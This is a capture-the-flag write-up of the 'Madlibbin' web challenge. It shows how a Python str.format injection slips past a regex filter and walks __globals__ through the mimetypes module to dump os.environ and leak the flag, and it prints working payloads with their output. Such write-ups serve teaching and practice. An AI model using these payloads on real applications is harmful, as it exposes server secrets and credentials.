# Madlibbin
Web (150 points, 26 solves)

## Challenge 

The Pastebin for Mad Libs: [Madlibbin](https://madlibbin.2019.chall.actf.co/), completely [open source](https://files.actf.co/30a52364fe87209004ea36a7c43d9a055fc197a46b7f2bf423ca7c9e197fc588/madlibbin.zip)! Have fun madlibbin'!

Author: defund

## Solution

Note: I did not solve this during the contest. 

Looking at the source code, we see that the app lets us write a madlib-type text with multiple blanks that are filled in at render time. This sounds just like SSTI...

Unfortunately, there is some parsing involved.

```python
parse = lambda x: list(dict.fromkeys(re.findall(r'(?<=\{args\[)[\w\-\s]+(?=\]\})', x)))
```

This is meant to parse out only properly formatted blanks like `{args[foo]}`. But, in doing this it must allow `{}` and `[]`. So, if our payload starts with `{args`, ends with `}`, and only uses letters and square brackets, then it should pass the check. We can continue with our SSTI, it just needs to start at `args`. 

Our goal is to get to `os.environ`, since the flag is in there.

```python
app.secret_key = os.environ.get('FLAG')
```

Putting just `{args}` in, we get `ImmutableMultiDict([])`. By using `__func__.__globals__`, we can get to `__globals__` through a function. `ImmutableMultiDict` has a function `clear`, lets use that. 

```python
{args.clear.__func__.__globals__}
```

```python
{'__name__': 'werkzeug.datastructures', '__doc__': '\n    werkzeug.datastructures\n    ~~~~~~~~~~~~~~~~~~~~~~~\n\n    This module provides mixins and classes with an immutable interface.\n\n    :copyright: 2007 Pallets\n    :license: BSD-3-Clause\n', '__package__': 'werkzeug', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7ff11f9de9e8>, '__spec__': ModuleSpec(name='werkzeug.datastructures', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7ff11f9de9e8>, origin='/usr/local/lib/python3.7/site-packages/werkzeug/datastructures.py'), '__file__': '/usr/local/lib/python3.7/site-packages/werkzeug/datastructures.py', '__cached__': '/usr/local/lib/python3.7/site-packages/werkzeug/__pycache__/datastructures.cpython-37.pyc', 
...
```

We get a bunch of globals. At least one of these has `os`, right? To find one, I `grep`ed for `import os` in my Python lib folder. 

```
$ grep -E "^import os" *.py
argparse.py:import os as _os
asyncore.py:import os
bdb.py:import os
binhex.py:import os
CGIHTTPServer.py:import os
cgi.py:import os
cgitb.py:import os
compileall.py:import os
dircache.py:import os
dumbdbm.py:import os as _os
filecmp.py:import os
ftplib.py:import os
genericpath.py:import os
getopt.py:import os
getpass.py:import os, sys, warnings
glob.py:import os
httplib.py:import os
ihooks.py:import os
inspect.py:import os
linecache.py:import os
macpath.py:import os
macurl2path.py:import os
mailbox.py:import os
mailcap.py:import os
mhlib.py:import os
mimetools.py:import os
mimetypes.py:import os
modulefinder.py:import os
netrc.py:import os, stat, shlex
ntpath.py:import os
os2emxpath.py:import os
_osx_support.py:import os
pdb.py:import os
pipes.py:import os
pkgutil.py:import os
pkgutil.py:import os.path
popen2.py:import os
posixpath.py:import os
profile.py:import os
pstats.py:import os
pty.py:import os
py_compile.py:import os
_pyio.py:import os
rexec.py:import os
shlex.py:import os.path
shutil.py:import os
SimpleHTTPServer.py:import os
SimpleXMLRPCServer.py:import os
site.py:import os
smtpd.py:import os
socket.py:import os, sys, warnings
SocketServer.py:import os
ssl.py:import os
subprocess.py:import os
sysconfig.py:import os
tabnanny.py:import os
tarfile.py:import os
tempfile.py:import os as _os
toaiff.py:import os
trace.py:import os
urllib2.py:import os
urllib.py:import os
user.py:import os
uuid.py:import os
uu.py:import os
webbrowser.py:import os
whichdb.py:import os
```

[Searching for all of these](solve.py) in our globals, we find that we have `mimetypes` imported. We can get to it through globals.

```python
{args.clear.__func__.__globals__[mimetypes]}
```

```python
<module 'mimetypes' from '/usr/local/lib/python3.7/mimetypes.py'>
```

From here, it is easy.

```python
{args.clear.__func__.__globals__[mimetypes].os.environ}
```

```python
environ({'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'HOSTNAME': '94659f75b57f', 'VIRTUAL_HOST': 'madlibbin.2019.chall.actf.co', 'LANG': 'C.UTF-8', 'GPG_KEY': '0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D', 'PYTHON_VERSION': '3.7.3', 'PYTHON_PIP_VERSION': '19.0.3', 'FLAG': 'actf{traversed_the_world_and_the_seven_seas}', 'HOME': '/root', 'SERVER_SOFTWARE': 'gunicorn/19.9.0'})
```

## Flag

```
actf{traversed_the_world_and_the_seven_seas}
```
